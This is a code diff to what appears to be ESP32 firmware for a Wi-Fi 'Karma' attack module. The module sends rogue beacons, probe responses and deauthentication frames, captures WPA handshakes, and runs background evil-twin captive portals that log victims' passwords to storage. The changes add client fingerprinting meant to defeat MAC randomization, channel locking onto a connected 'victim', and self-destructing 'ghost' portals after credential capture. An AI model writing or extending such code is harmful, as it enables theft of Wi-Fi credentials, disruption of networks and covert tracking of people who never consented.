@@ -34,7 +34,7 @@ const uint8_t karma_channels[] PROGMEM = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12,
 #define SAVE_INTERVAL 10
 #define MAX_PROBE_BUFFER 200
 #define MAC_CACHE_SIZE 100
-#define MAX_CLIENT_TRACK 30
+#define MAX_CLIENT_TRACK 30          // Track up to 30 unique clients (by fingerprint)
 #define FAST_HOP_INTERVAL 500
 #define DEFAULT_HOP_INTERVAL 2000
 #define DEAUTH_INTERVAL 30000
@@ -47,7 +47,7 @@ const uint8_t karma_channels[] PROGMEM = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12,
 #define MAC_ROTATION_INTERVAL 30000
 #define MAX_PORTAL_TEMPLATES 10
 #define MAX_PENDING_PORTALS 10
-#define MAX_SSID_DB_SIZE 500
+#define MAX_SSID_DB_SIZE 500          // Keep 500 SSIDs in RAM at once
 #define MAX_POPULAR_SSIDS 20
 #define MAX_NETWORK_HISTORY 30
 #define ACTIVE_PORTAL_CHANNEL 0
@@ -56,46 +56,22 @@ const uint8_t karma_channels[] PROGMEM = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12,
 #define BEACON_BURST_SIZE 8
 #define BEACON_BURST_INTERVAL 60
 #define LISTEN_WINDOW 250
-#define PORTAL_HEARTBEAT_INTERVAL 500
-#define PORTAL_MAX_IDLE 60000
+#define PORTAL_HEARTBEAT_INTERVAL 500  // Check each portal every 500ms
+#define PORTAL_MAX_IDLE 60000          // Kill portals after 60s idle
+#define POST_DEAUTH_LISTEN_MS 50       // Listen for probes after deauth
 
-enum KarmaMode {
-    MODE_PASSIVE = 0,
-    MODE_BROADCAST = 1,
-    MODE_FULL = 2
-};
-
-KarmaMode currentMode = MODE_PASSIVE;
+enum KarmaMode currentMode = MODE_PASSIVE;
 bool karmaPaused = false;
 
-struct BackgroundPortal {
-    EvilPortal* instance;
-    String portalId;
-    String ssid;
-    uint8_t channel;
-    unsigned long lastHeartbeat;
-    unsigned long launchTime;
-    bool hasCreds;
-    String capturedPassword;
-    
-    BackgroundPortal() : instance(nullptr), channel(0), lastHeartbeat(0), launchTime(0), hasCreds(false) {}
-};
-
-struct HandshakeCapture {
-    uint8_t bssid[6];
-    String ssid;
-    uint8_t channel;
-    uint32_t timestamp;
-    uint8_t eapolFrame[256];
-    uint16_t frameLen;
-    bool complete;
-};
-
+// Background portal tracking - now using pointer vector (fixes duplicate declaration)
 std::vector<BackgroundPortal*> activePortals;
-std::vector<HandshakeCapture> handshakeBuffer;
 int nextPortalIndex = 0;
 unsigned long lastPortalHeartbeat = 0;
 bool handshakeCaptureEnabled = false;
+std::vector<HandshakeCapture> handshakeBuffer;
+
+// Client tracking now keyed by fingerprint, not MAC (overcomes randomization)
+std::map<uint32_t, ClientBehavior> clientBehaviors;
 
 const uint8_t vendorOUIs[][3] PROGMEM = {
     {0x00, 0x50, 0xF2}, {0x00, 0x1A, 0x11}, {0x00, 0x1B, 0x63}, {0x00, 0x24, 0x01},
@@ -135,6 +111,7 @@ bool SSIDDatabase::cacheLoaded = false;
 String SSIDDatabase::currentFilename = "/ssid_list.txt";
 bool SSIDDatabase::useLittleFS = false;
 
+// Helper: Generate clean display name from file path
 String getDisplayName(const String &fullPath, bool isSD) {
     String prefix = isSD ? "[SD] " : "[FS] ";
     String filename = fullPath.substring(fullPath.lastIndexOf('/') + 1);
@@ -142,6 +119,7 @@ String getDisplayName(const String &fullPath, bool isSD) {
     return prefix + filename;
 }
 
+// Helper: Generate unique portal ID for file naming
 String generatePortalId(const String &templateName) {
     static int counter = 0;
     String safeName = templateName;
@@ -163,6 +141,7 @@ String generatePortalId(const String &templateName) {
     return safeName + "_" + String(instance);
 }
 
+// Save captured portal credentials to SD/LittleFS
 void savePortalCredentials(const String &ssid, const String &identifier, 
                           const String &password, const String &mac,
                           uint8_t channel, const String &templateName,
@@ -171,6 +150,7 @@ void savePortalCredentials(const String &ssid, const String &identifier,
     FS *fs = nullptr;
     if (!getFsStorage(fs)) return;
     
+    // Create directory if needed
     if (!fs->exists("/PortalCreds")) {
         if (!fs->mkdir("/PortalCreds")) {
             Serial.println("[ERROR] Cannot create /PortalCreds");
@@ -178,6 +158,7 @@ void savePortalCredentials(const String &ssid, const String &identifier,
         }
     }
     
+    // Save individual portal file
     String filename = "/PortalCreds/" + portalId + ".txt";
     File file = fs->open(filename, FILE_WRITE);
     if (file) {
@@ -195,6 +176,7 @@ void savePortalCredentials(const String &ssid, const String &identifier,
         Serial.printf("[PORTAL] Credentials saved to %s\n", filename.c_str());
     }
     
+    // Append to master log for quick review
     File logFile = fs->open("/PortalCreds/captures_master.txt", FILE_APPEND);
     if (logFile) {
         logFile.printf("Time:%lu | Portal:%s | SSID:%s | ID:%s | PWD:%s | MAC:%s | CH:%d\n",
@@ -204,6 +186,7 @@ void savePortalCredentials(const String &ssid, const String &identifier,
     }
 }
 
+// Save handshake to PCAP file
 void saveHandshakeToFile(const HandshakeCapture &hs) {
     FS *fs = nullptr;
     if (!getFsStorage(fs)) return;
@@ -233,6 +216,12 @@ void saveHandshakeToFile(const HandshakeCapture &hs) {
         file.write(hs.eapolFrame, hs.frameLen);
         file.close();
     }
+}
+
+// Helper for setting channel with proper second channel parameter
+void setChannelWithSecond(uint8_t channel) {
+    wifi_second_chan_t secondCh = WIFI_SECOND_CHAN_NONE;  // Use enum, not NULL
+    esp_wifi_set_channel(channel, secondCh);
 }
 
 bool SSIDDatabase::loadFromFile() {
@@ -620,7 +609,6 @@ ProbeRequest probeBuffer[MAX_PROBE_BUFFER];
 uint16_t probeBufferIndex = 0;
 bool bufferWrapped = false;
 
-std::map<String, ClientBehavior> clientBehaviors;
 KarmaConfig karmaConfig;
 AttackConfig attackConfig;
 bool screenNeedsRedraw = false;
@@ -655,8 +643,8 @@ bool templateSelected = false;
 std::map<String, uint16_t> ssidFrequency;
 std::vector<std::pair<String, uint16_t>> popularSSIDs;
 
+// Legacy pending portals (for compatibility)
 std::vector<PendingPortal> pendingPortals;
-std::vector<PendingPortal> activePortals;
 
 String generateUniqueFilename(FS &fs, bool compressed) {
     String basePath = "/ProbeData/";
@@ -699,6 +687,32 @@ void addMACToCache(const String &mac) {
         if (oldItem) vRingbufferReturnItem(macRingBuffer, oldItem);
     }
     xRingbufferSend(macRingBuffer, mac.c_str(), mac.length() + 1, pdMS_TO_TICKS(100));
+}
+
+// Generate client fingerprint from probe request IEs
+uint32_t generateClientFingerprint(const uint8_t *frame, int len) {
+    uint32_t hash = 5381;  // DJB2 hash start
+    int pos = 24;           // Start of tags
+    
+    while (pos + 1 < len) {
+        uint8_t tag = frame[pos];
+        uint8_t tagLen = frame[pos + 1];
+        
+        if (pos + 2 + tagLen > len) break;
+        
+        // Include tag number and length in hash
+        hash = ((hash << 5) + hash) + tag;          // hash * 33 + tag
+        hash = ((hash << 5) + hash) + tagLen;       // hash * 33 + length
+        
+        // Include first few bytes of tag content (vendor-specific often)
+        for (int i = 0; i < min(4, tagLen); i++) {
+            hash = ((hash << 5) + hash) + frame[pos + 2 + i];
+        }
+        
+        pos += 2 + tagLen;
+    }
+    
+    return hash;
 }
 
 bool isProbeRequestWithSSID(const wifi_promiscuous_pkt_t *packet) {
@@ -809,11 +823,28 @@ int classifyEAPOLMessage(const wifi_promiscuous_pkt_t *pkt) {
 }
 
 void analyzeClientBehavior(const ProbeRequest &probe) {
-    if (clientBehaviors.size() >= MAX_CLIENT_TRACK) return;
-    auto it = clientBehaviors.find(probe.mac);
+    // Use fingerprint as key, not MAC
+    auto it = clientBehaviors.find(probe.fingerprint);
+    
     if (it == clientBehaviors.end()) {
+        if (clientBehaviors.size() >= MAX_CLIENT_TRACK) {
+            // Find oldest client by lastSeen
+            uint32_t oldestFingerprint = 0;
+            unsigned long oldestTime = UINT32_MAX;
+            for (const auto &pair : clientBehaviors) {
+                if (pair.second.lastSeen < oldestTime) {
+                    oldestTime = pair.second.lastSeen;
+                    oldestFingerprint = pair.first;
+                }
+            }
+            if (oldestFingerprint != 0) {
+                clientBehaviors.erase(oldestFingerprint);
+            }
+        }
+        
         ClientBehavior behavior;
-        behavior.mac = probe.mac;
+        behavior.fingerprint = probe.fingerprint;
+        behavior.lastMAC = probe.mac;
         behavior.firstSeen = probe.timestamp;
         behavior.lastSeen = probe.timestamp;
         behavior.probeCount = 1;
@@ -822,7 +853,7 @@ void analyzeClientBehavior(const ProbeRequest &probe) {
         behavior.favoriteChannel = probe.channel;
         behavior.lastKarmaAttempt = 0;
         behavior.isVulnerable = (probe.ssid.length() > 0 && probe.ssid != "*WILDCARD*");
-        clientBehaviors[probe.mac] = behavior;
+        clientBehaviors[probe.fingerprint] = behavior;
         uniqueClients++;
     } else {
         ClientBehavior &behavior = it->second;
@@ -988,9 +1019,12 @@ size_t buildBeaconFrame(uint8_t *buffer, const String &ssid, uint8_t channel, co
     pos += 6;
     buffer[pos++] = 0x00;
     buffer[pos++] = 0x00;
-    static uint64_t timestamp = 0;
-    timestamp += 1024;
-    for (int i = 0; i < 8; i++) buffer[pos++] = (timestamp >> (8 * i)) & 0xFF;
+    
+    // Use hardware TSF timer for accurate timestamps
+    uint64_t tsf = esp_wifi_get_tsf_time(WIFI_IF_AP);
+    memcpy(&buffer[pos], &tsf, 8);
+    pos += 8;
+    
     buffer[pos++] = 0x64;
     buffer[pos++] = 0x00;
     if (rsn.akmSuite > 0) {
@@ -1052,9 +1086,12 @@ void sendBeaconFrameHelper(const String &ssid, uint8_t channel) {
     pos += 6;
     beaconPacket[pos++] = 0x00;
     beaconPacket[pos++] = 0x00;
-    uint64_t timestamp = esp_timer_get_time() / 1000;
-    memcpy(&beaconPacket[pos], &timestamp, 8);
+    
+    // Use hardware TSF timer
+    uint64_t tsf = esp_wifi_get_tsf_time(WIFI_IF_AP);
+    memcpy(&beaconPacket[pos], &tsf, 8);
     pos += 8;
+    
     beaconPacket[pos++] = 0x64;
     beaconPacket[pos++] = 0x00;
     beaconPacket[pos++] = 0x01;
@@ -1072,7 +1109,8 @@ void sendBeaconFrameHelper(const String &ssid, uint8_t channel) {
     beaconPacket[pos++] = 0x03;
     beaconPacket[pos++] = 0x01;
     beaconPacket[pos++] = channel;
-    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+    
+    setChannelWithSecond(channel);
     esp_wifi_80211_tx(WIFI_IF_AP, beaconPacket, pos, false);
 }
 
@@ -1113,7 +1151,7 @@ void sendProbeResponse(const String &ssid, const String &mac, uint8_t channel) {
     probeResponse[pos++] = 0x03;
     probeResponse[pos++] = 0x01;
     probeResponse[pos++] = channel;
-    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+    setChannelWithSecond(channel);
     esp_wifi_80211_tx(WIFI_IF_AP, probeResponse, pos, false);
     karmaResponsesSent++;
 }
@@ -1151,7 +1189,7 @@ void sendDeauth(const String &mac, uint8_t channel, bool broadcast) {
     deauthPacket[21] = 0x00;
     deauthPacket[22] = 0x01;
     deauthPacket[23] = 0x00;
-    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+    setChannelWithSecond(channel);
     esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, 24, false);
     if (err == ESP_OK) {
         deauthPacketsSent++;
@@ -1194,7 +1232,7 @@ void processResponseQueue() {
         uint8_t responseFrame[256];
         size_t frameLen = buildEnhancedProbeResponse(responseFrame, task.ssid, task.targetMAC,
                                                     task.channel, task.rsn, false);
-        esp_wifi_set_channel(task.channel, WIFI_SECOND_CHAN_NONE);
+        setChannelWithSecond(task.channel);
         esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, responseFrame, frameLen, false);
         if (err == ESP_OK) {
             karmaResponsesSent++;
@@ -1264,10 +1302,24 @@ void checkForAssociations() {
 void smartChannelHop() {
     if (!auto_hopping || karmaPaused) return;
 
-    if (activePortalChannel > 0) {
-        if (channl != activePortalChannel - 1) {
-            channl = activePortalChannel - 1;
-            esp_wifi_set_channel(activePortalChannel, WIFI_SECOND_CHAN_NONE);
+    // Check if any active portal has a connected victim
+    bool victimActive = false;
+    uint8_t lockedChannel = 0;
+    
+    for (auto portal : activePortals) {
+        if (portal->victimConnected && 
+            (millis() - portal->lastClientActivity < 5000)) {
+            victimActive = true;
+            lockedChannel = portal->channel;
+            break;
+        }
+    }
+    
+    if (victimActive) {
+        // Lock to victim's channel
+        if (channl != lockedChannel - 1) {
+            channl = lockedChannel - 1;
+            setChannelWithSecond(lockedChannel);
         }
         return;
     }
@@ -1277,7 +1329,7 @@ void smartChannelHop() {
     currentPriorityChannel = (currentPriorityChannel + 1) % NUM_PRIORITY_CHANNELS;
     uint8_t channel = pgm_read_byte(&priorityChannels[currentPriorityChannel]);
     channl = channel - 1;
-    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+    setChannelWithSecond(channel);
     last_ChannelChange = now;
 }
 
@@ -1349,6 +1401,7 @@ void checkCloneAttackOpportunities() {
     }
 }
 
+// Background portal management with channel locking
 void checkPortals() {
     if (karmaPaused) return;
     unsigned long now = millis();
@@ -1360,20 +1413,87 @@ void checkPortals() {
         return;
     }
     
+    // Check if any portal has an active victim (for channel locking)
+    bool victimActive = false;
+    uint8_t lockedChannel = 0;
+    int victimPortalIndex = -1;
+    
+    for (size_t i = 0; i < activePortals.size(); i++) {
+        BackgroundPortal* p = activePortals[i];
+        if (p->victimConnected && (now - p->lastClientActivity < 5000)) {
+            victimActive = true;
+            lockedChannel = p->channel;
+            victimPortalIndex = i;
+            break;
+        }
+    }
+    
+    if (victimActive) {
+        // Lock to victim's channel, only service that portal
+        if (channl != lockedChannel - 1) {
+            channl = lockedChannel - 1;
+            setChannelWithSecond(lockedChannel);
+        }
+        
+        BackgroundPortal* portal = activePortals[victimPortalIndex];
+        portal->instance->processRequests();
+        portal->lastHeartbeat = now;
+        
+        // Check for credentials (POST only - ghost portal logic)
+        if (portal->instance->hasCredentials()) {
+            portal->hasCreds = true;
+            portal->capturedPassword = portal->instance->getCapturedPassword();
+            portal->markedForRemoval = true;
+            
+            savePortalCredentials(
+                portal->ssid,
+                "user",
+                portal->capturedPassword,
+                "unknown",
+                portal->channel,
+                portal->instance->getApName(),
+                portal->portalId
+            );
+            
+            // Kill portal immediately - ghost effect
+            delete portal->instance;
+            portal->instance = nullptr;
+        }
+        
+        lastPortalHeartbeat = now;
+        
+        // Cleanup marked portals
+        activePortals.erase(std::remove_if(activePortals.begin(), activePortals.end(),
+            [now](BackgroundPortal* p) {
+                if (p->markedForRemoval || (now - p->launchTime > PORTAL_MAX_IDLE)) {
+                    if (p->instance) delete p->instance;
+                    delete p;
+                    return true;
+                }
+                return false;
+            }), activePortals.end());
+        
+        return;
+    }
+    
+    // No active victims - normal round-robin
     BackgroundPortal* portal = activePortals[nextPortalIndex];
     
-    esp_wifi_set_channel(portal->channel, WIFI_SECOND_CHAN_NONE);
+    // Switch to portal's channel
+    setChannelWithSecond(portal->channel);
     portal->instance->processRequests();
     
+    // Check for credentials
     if (portal->instance->hasCredentials()) {
         portal->hasCreds = true;
         portal->capturedPassword = portal->instance->getCapturedPassword();
+        portal->markedForRemoval = true;
         
         savePortalCredentials(
             portal->ssid,
-            "user",  
+            "user",
             portal->capturedPassword,
-            "unknown",  
+            "unknown",
             portal->channel,
             portal->instance->getApName(),
             portal->portalId
@@ -1388,9 +1508,10 @@ void checkPortals() {
     nextPortalIndex = (nextPortalIndex + 1) % activePortals.size();
     lastPortalHeartbeat = now;
     
+    // Cleanup marked portals
     activePortals.erase(std::remove_if(activePortals.begin(), activePortals.end(),
         [now](BackgroundPortal* p) {
-            if (p->hasCreds || (now - p->launchTime > PORTAL_MAX_IDLE)) {
+            if (p->markedForRemoval || (now - p->launchTime > PORTAL_MAX_IDLE)) {
                 if (p->instance) delete p->instance;
                 delete p;
                 return true;
@@ -1399,6 +1520,7 @@ void checkPortals() {
         }), activePortals.end());
 }
 
+// Launch a portal in background mode (no UI)
 void launchBackgroundPortal(const String &ssid, uint8_t channel, const String &templateName) {
     if (activePortals.size() >= MAX_PENDING_PORTALS) return;
     
@@ -1408,12 +1530,17 @@ void launchBackgroundPortal(const String &ssid, uint8_t channel, const String &t
     portal->launchTime = millis();
     portal->lastHeartbeat = millis();
     portal->hasCreds = false;
+    portal->victimConnected = false;
+    portal->lastClientActivity = 0;
+    portal->markedForRemoval = false;
     portal->portalId = generatePortalId(templateName);
     
+    // Create portal in background mode (last param = true for background)
     portal->instance = new EvilPortal(ssid, channel, false, false, true, true);
     
     activePortals.push_back(portal);
-    Serial.printf("[PORTAL] Launched background portal %s on ch%d\n", ssid.c_str(), channel);
+    Serial.printf("[PORTAL] Launched background portal %s on ch%d (ID: %s)\n", 
+                  ssid.c_str(), channel, portal->portalId.c_str());
 }
 
 void loadPortalTemplates() {
@@ -1704,11 +1831,17 @@ void launchManualEvilPortal(const String &ssid, uint8_t channel, bool verifyPwd)
 void handleBroadcastResponse(const String& ssid, const String& mac) {
     if (broadcastAttack.isActive() && !karmaPaused) {
         broadcastAttack.processProbeResponse(ssid, mac);
+        
+        // Find client by fingerprint in probe buffer? For now, use MAC
+        uint32_t fingerprint = 0; // Would need to look up from probe
+        
         if (clientBehaviors.size() >= MAX_CLIENT_TRACK) return;
-        auto it = clientBehaviors.find(mac);
+        
+        auto it = clientBehaviors.find(fingerprint);
         if (it == clientBehaviors.end()) {
             ClientBehavior behavior;
-            behavior.mac = mac;
+            behavior.fingerprint = fingerprint;
+            behavior.lastMAC = mac;
             behavior.firstSeen = millis();
             behavior.lastSeen = millis();
             behavior.probeCount = 1;
@@ -1717,8 +1850,9 @@ void handleBroadcastResponse(const String& ssid, const String& mac) {
             behavior.favoriteChannel = pgm_read_byte(&karma_channels[channl % 14]);
             behavior.lastKarmaAttempt = 0;
             behavior.isVulnerable = true;
-            clientBehaviors[mac] = behavior;
+            clientBehaviors[fingerprint] = behavior;
             uniqueClients++;
+            
             if (karmaConfig.enableAutoKarma && pendingPortals.size() < MAX_PENDING_PORTALS) {
                 PendingPortal portal;
                 portal.ssid = ssid;
@@ -1819,7 +1953,7 @@ void probe_sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
         hs.frameLen = pkt->rx_ctrl.sig_len;
         if (hs.frameLen > 256) hs.frameLen = 256;
         memcpy(hs.eapolFrame, pkt->payload, hs.frameLen);
-        hs.complete = (classifyEAPOLMessage(pkt) == 4); 
+        hs.complete = (classifyEAPOLMessage(pkt) == 4);
         handshakeBuffer.push_back(hs);
         if (handshakeBuffer.size() > 20) handshakeBuffer.erase(handshakeBuffer.begin());
         if (hs.complete) saveHandshakeToFile(hs);
@@ -1831,7 +1965,10 @@ void probe_sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
     String ssid = extractSSID(pkt);
     if (mac.isEmpty()) return;
 
-    String cacheKey = mac + ":" + ssid;
+    // Generate client fingerprint (overcomes MAC randomization)
+    uint32_t fingerprint = generateClientFingerprint(frame, pkt->rx_ctrl.sig_len);
+    
+    String cacheKey = mac + ":" + String(fingerprint);
     if (isMACInCache(cacheKey)) return;
     addMACToCache(cacheKey);
 
@@ -1844,6 +1981,7 @@ void probe_sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
     probe.rssi = ctrl.rssi;
     probe.timestamp = millis();
     probe.channel = pgm_read_byte(&karma_channels[channl % 14]);
+    probe.fingerprint = fingerprint;
 
     if (hasRSNInfo) {
         probe.frame_len = pkt->rx_ctrl.sig_len;
@@ -1883,7 +2021,7 @@ void probe_sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
     }
 
     if (karmaConfig.enableAutoKarma) {
-        auto it = clientBehaviors.find(probe.mac);
+        auto it = clientBehaviors.find(probe.fingerprint);
         if (it != clientBehaviors.end()) {
             ClientBehavior &client = it->second;
             uint8_t priority = calculateAttackPriority(client, probe);
@@ -1928,7 +2066,6 @@ void clearProbes() {
     cloneAttacksLaunched = 0;
     beaconsSent = 0;
     pendingPortals.clear();
-    activePortals.clear();
     activeNetworks.clear();
     ssidFrequency.clear();
     popularSSIDs.clear();
@@ -1938,7 +2075,17 @@ void clearProbes() {
     assocBlocked = 0;
     handshakeBuffer.clear();
     memset(channelActivity, 0, sizeof(channelActivity));
+    
+    // Clean up client behaviors
     clientBehaviors.clear();
+    
+    // Clean up active portals
+    for (auto portal : activePortals) {
+        if (portal->instance) delete portal->instance;
+        delete portal;
+    }
+    activePortals.clear();
+    
     while (!responseQueue.empty()) responseQueue.pop();
     if (macRingBuffer) {
         vRingbufferDelete(macRingBuffer);
@@ -1951,7 +2098,7 @@ void clearProbes() {
 
 std::vector<ProbeRequest> getUniqueProbes() {
     std::vector<ProbeRequest> unique;
-    std::set<String> seen;
+    std::set<String> seen;  // Use fingerprint + SSID as key
     int start = bufferWrapped ? probeBufferIndex : 0;
     int count = bufferWrapped ? MAX_PROBE_BUFFER : probeBufferIndex;
     count = std::min(count, 20);
@@ -1959,7 +2106,7 @@ std::vector<ProbeRequest> getUniqueProbes() {
         int idx = (start + i) % MAX_PROBE_BUFFER;
         const ProbeRequest &probe = probeBuffer[idx];
         if (probe.ssid.isEmpty() || probe.ssid == "*WILDCARD*") continue;
-        String key = probe.mac + ":" + probe.ssid;
+        String key = String(probe.fingerprint) + ":" + probe.ssid;
         if (seen.find(key) == seen.end()) {
             seen.insert(key);
             unique.push_back(probe);
@@ -2100,7 +2247,6 @@ void karma_setup() {
     if (macRingBuffer) vRingbufferDelete(macRingBuffer);
     initMACCache();
     pendingPortals.clear();
-    activePortals.clear();
     activeNetworks.clear();
     clientBehaviors.clear();
     ssidFrequency.clear();
@@ -2108,6 +2254,14 @@ void karma_setup() {
     networkHistory.clear();
     macBlacklist.clear();
     handshakeBuffer.clear();
+    
+    // Clean up any existing portals
+    for (auto portal : activePortals) {
+        if (portal->instance) delete portal->instance;
+        delete portal;
+    }
+    activePortals.clear();
+    
     while (!responseQueue.empty()) responseQueue.pop();
     generateRandomBSSID(currentBSSID);
     lastMACRotation = millis();
@@ -2170,7 +2324,7 @@ void karma_setup() {
     esp_wifi_set_promiscuous_filter(&filter);
     esp_wifi_set_promiscuous(true);
     esp_wifi_set_promiscuous_rx_cb(probe_sniffer);
-    wifi_second_chan_t secondCh = (wifi_second_chan_t)NULL;
+    wifi_second_chan_t secondCh = WIFI_SECOND_CHAN_NONE;
     esp_wifi_set_channel(pgm_read_byte(&karma_channels[channl % 14]), secondCh);
     isInitialized = true;
     vTaskDelay(1000 / portTICK_RATE_MS);
@@ -2224,8 +2378,7 @@ void karma_setup() {
             if (!karmaPaused) esp_wifi_set_promiscuous(false);
             channl++;
             if (channl >= 14) channl = 0;
-            wifi_second_chan_t secondCh = (wifi_second_chan_t)NULL;
-            esp_wifi_set_channel(pgm_read_byte(&karma_channels[channl % 14]), secondCh);
+            setChannelWithSecond(pgm_read_byte(&karma_channels[channl % 14]));
             screenNeedsRedraw = true;
             if (!karmaPaused) {
                 vTaskDelay(50 / portTICK_RATE_MS);
@@ -2237,8 +2390,7 @@ void karma_setup() {
             if (!karmaPaused) esp_wifi_set_promiscuous(false);
             if (channl == 0) channl = 13;
             else channl--;
-            wifi_second_chan_t secondCh = (wifi_second_chan_t)NULL;
-            esp_wifi_set_channel(pgm_read_byte(&karma_channels[channl % 14]), secondCh);
+            setChannelWithSecond(pgm_read_byte(&karma_channels[channl % 14]));
             screenNeedsRedraw = true;
             if (!karmaPaused) {
                 vTaskDelay(50 / portTICK_PERIOD_MS);
@@ -2342,7 +2494,7 @@ void karma_setup() {
                                 if (!karmaPaused) esp_wifi_set_promiscuous(false);
                                 channl++;
                                 if (channl >= 14) channl = 0;
-                                esp_wifi_set_channel(pgm_read_byte(&karma_channels[channl % 14]), NULL);
+                                setChannelWithSecond(pgm_read_byte(&karma_channels[channl % 14]));
                                 screenNeedsRedraw = true;
                                 if (!karmaPaused) esp_wifi_set_promiscuous(true);
                                 displayTextLine("Channel: " + String(karma_channels[channl % 14]));
@@ -2352,7 +2504,7 @@ void karma_setup() {
                                 if (!karmaPaused) esp_wifi_set_promiscuous(false);
                                 if (channl == 0) channl = 13;
                                 else channl--;
-                                esp_wifi_set_channel(pgm_read_byte(&karma_channels[channl % 14]), NULL);
+                                setChannelWithSecond(pgm_read_byte(&karma_channels[channl % 14]));
                                 screenNeedsRedraw = true;
                                 if (!karmaPaused) esp_wifi_set_promiscuous(true);
                                 displayTextLine("Channel: " + String(karma_channels[channl % 14]));
@@ -2470,7 +2622,7 @@ void karma_setup() {
                         std::vector<Option> karmaOptions;
                         for (const auto &client : vulnerable) {
                             if (!client.probedSSIDs.empty()) {
-                                String itemText = client.mac.substring(9) + " (VULN)";
+                                String itemText = client.lastMAC.substring(9) + " (VULN)";
                                 karmaOptions.push_back({itemText.c_str(), [=, &client]() {
                                     launchManualEvilPortal(client.probedSSIDs[0], 
                                                           client.favoriteChannel, 
